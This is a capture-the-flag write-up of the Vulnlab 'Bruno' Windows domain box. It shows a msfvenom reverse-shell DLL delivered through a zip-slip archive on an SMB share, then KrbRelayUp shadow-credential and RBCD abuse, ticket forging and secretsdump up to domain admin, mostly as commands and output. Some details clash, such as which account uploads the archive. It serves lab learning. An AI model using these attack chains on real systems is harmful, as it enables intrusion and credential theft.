---
title: "Bruno"
---

# Vulnlab - Bruno Writeup

![Cap dashboard screenshot](bruno.png)

Here is my note on the Bruno box from Vulnlab.Bruno is a medium-difficulty Windows domain box that chains insecure application configuration and weak Active Directory hygiene to go from no access to domain admin. The service-facing component is a custom .NET application that extracts ZIP entries unsafely using Path.Combine, allowing crafted archives to perform a zip-slip and place files under C:\samples\app. That capability enables a DLL-search-path hijack - an attacker who can write to the queue share can drop a malicious dll and achieve code execution as the service user. On the network/AD side, an account svc_scan is discoverable and kerberoastable/AS-REP crackable; its recovered credentials grant write access to the queue share, which is used to trigger the DLL payload and get a low-privilege shell. From there the default machine account quota of authenticated users and RBCD are abused to perform a Kerberos relay/RBCD attack that resets the Administrator password and yields full domain compromise.

## Reconnaissance

### Nmap

```text
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-29-22  04:55PM       <DIR>          app
| 06-29-22  04:33PM       <DIR>          benign
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0	
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-27 16:17:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### FTP Enumeration

I started by checking the anonymous FTP service. It exposed two directories, `app` and `benign`.

```text
ftp> cd benign
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||62894|)
125 Data connection already open; Transfer starting.
06-29-22  04:32PM                    4 test.exe
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> cd app
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||62901|)
150 Opening ASCII mode data connection.
06-29-22  05:42PM                  165 changelog
06-28-22  07:15PM                  431 SampleScanner.deps.json
06-29-22  03:58PM                 7168 SampleScanner.dll
06-29-22  03:58PM               174592 SampleScanner.exe
06-28-22  07:15PM                  170 SampleScanner.runtimeconfig.dev.json
06-28-22  07:15PM                  154 SampleScanner.runtimeconfig.json
226 Transfer complete.
```

## Initial Access

`Access-Denied` suggested the application was missing a DLL or failing to load one properly. That pointed to a DLL hijacking opportunity in `SampleScanner`.

### DLL Hijacking Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.71 LPORT=2222 -f dll > Microsoft.DiaSymReader.Native.amd64.dll
python2 evilarc.py Microsoft.DiaSymReader.Native.amd64.dll -p app -d 1
```

```text
Creating evil.zip containing ..\app\Microsoft.DiaSymReader.Native.amd64.dll
```

I uploaded the archive to the writable `queue` share.

```bash
smbclient \\\\10.10.87.117\\queue -U "svc_net"
```

```text
Password for [WORKGROUP\svc_net]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 27 11:58:28 2024
  ..                                  D        0  Wed Jun 29 09:41:03 2022

                7863807 blocks of size 4096. 3737830 blocks available
smb: \> put evil.zip
putting file evil.zip as \evil.zip (15.0 kb/s) (average 15.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Jan 27 12:47:13 2024
  ..                                  D        0  Wed Jun 29 09:41:03 2022
  evil.zip                            A     9406  Sat Jan 27 12:47:13 2024

                7863807 blocks of size 4096. 3737827 blocks available
smb: \>
```

### Shell

```text
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.8.0.71:2222
[*] Command shell session 1 opened (10.8.0.71:2222 -> 10.10.87.117:62242) at 2024-01-27 12:47:33 -0500
```

```text
C:\Windows\system32>whoami
bruno\svc_scan
```

### User Flag

```text
*Evil-WinRM* PS C:\> type user.txt
VL{REDIRECTED}
```

## Privilege Escalation

The box had the ingredients for Kerberos relay and certificate abuse: LDAP signing was not enforced, and the domain allowed machine account creation.

### Machine Account Quota

```bash
crackmapexec ldap 10.10.87.117 -u svc_scan -p 'Sunshine1' -M maq
```

```text
SMB         10.10.87.117    445    BRUNODC          [*] Windows 10.0 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
LDAP        10.10.87.117    389    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1
MAQ         10.10.87.117    389    BRUNODC          [*] Getting the MachineAccountQuota
MAQ         10.10.87.117    389    BRUNODC          MachineAccountQuota: 10
```

### LDAP Signing

```bash
crackmapexec ldap 10.10.87.117 -u svc_scan -p 'Sunshine1' -M ldap-checker
```

```text
SMB         10.10.87.117    445    BRUNODC          [*] Windows 10.0 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
LDAP        10.10.87.117    389    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1
LDAP-CHE... 10.10.87.117    389    BRUNODC          LDAP Signing NOT Enforced!
LDAP-CHE... 10.10.87.117    389    BRUNODC          Channel Binding is set to "NEVER" - Time to PWN!
```

### Shadow Credentials

```text
.\KrbRelayUp.exe full -m shadowcred -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 10246
```

```text
Rubeus.exe asktgt /user:brunodc$ /certificate:MIIKSAIBAzCCCgQGC...snip.... /password:tV0-oN8$aB7- /enctype:AES256 /nowrap
```

### Ticket Conversion

```bash
cat bruno_ticket | base64 -d > bruno_ticket.kirbi
impacket-ticketConverter bruno_ticket.kirbi bruno_ticket.ccache
export KRB5CCNAME=./bruno_ticket.ccache
```

```text
[*] converting kirbi to ccache...
[+] done
```

### Dumping Secrets

```bash
secretsdump.py 'brunodc$'@brunodc.bruno.vl -k -no-pass
```

```text
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:REDIRECTED
```

### RBCD

```text
.\KrbRelayUp.exe full -m rbcd -c -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 10246
getST.py -impersonate 'Administrator' bruno.vl/'KRBRELAYUP$':'hV1/xN0#aF8=yW1$' -spn HOST/BRUNODC
smbexec.py administrator@brunodc -k -no-pass
```

### Admin Shell

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/29/2022   3:00 PM             37 root.txt
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
VL{REDIRECTED}
```
## Attack Path

- **Enumerate the target** — identify FTP, SMB, LDAP, Kerberos, IIS, and the exposed certificate services.
- **Use anonymous FTP** — pull the `app` and `benign` directories and inspect `SampleScanner`.
- **Find the DLL hijack** — notice the app fails with an access denied error, which points to a missing DLL load.
- **Build the payload** — generate a malicious DLL with `msfvenom` and wrap it in a path-traversal ZIP using `evilarc`.
- **Upload to the queue share** — place the crafted archive into the writable SMB share so the victim processes it.
- **Catch the user shell** — receive a reverse shell as `bruno\svc_scan`.
- **Harvest domain context** — confirm `MachineAccountQuota` and test LDAP signing; both make relay-style attacks possible.
- **AS-REP roast `svc_scan`** — extract the Kerberos hash and crack it to recover the password `Sunshine1`.
- **Request service tickets** — use `GetUserSPNs` to enumerate SPNs for `svc_net` and `svc_scan`.
- **Crack the TGS hashes** — recover the `svc_net` password and reuse it for SMB and AD enumeration.
- **Inspect SYSVOL and CertEnroll** — discover that AD CS is present and that certificate enrollment is available.
- **Check certificate abuse paths** — identify the CA and confirm ESC8-style weakness via web enrollment.
- **Leverage KrbRelayUp** — use shadow credentials / RBCD to obtain a Kerberos ticket for the domain controller.
- **Convert and reuse tickets** — transform the ticket into `ccache` format and authenticate with Kerberos.
- **Dump domain secrets** — run `secretsdump.py` to extract the Administrator NT hash.
- **Escalate to admin** — use `getST.py` and `smbexec.py` to impersonate Administrator and get a privileged shell.
- **Read the flags** — collect `user.txt` and `root.txt` from the target.

